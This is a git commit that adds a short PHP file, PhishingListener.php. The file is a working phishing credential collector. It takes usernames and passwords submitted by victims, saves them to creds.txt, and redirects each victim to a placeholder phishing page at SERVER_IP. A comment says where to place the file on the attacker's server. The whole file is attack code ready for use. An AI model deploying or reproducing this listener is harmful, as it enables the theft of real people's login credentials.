79c2ba27f1b2d24ac117a6d40e2fcb6275ec9853
Shockp <59491201+Shockp@users.noreply.github.com>
2023-05-23 23:12:42 +0200

    Create PhishingListener.php

---
+++ PhishingListener.php
@@ -0,0 +1,11 @@
+#Create a file called index.php and place it in '/tmp/tmpserver/index.php
+
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
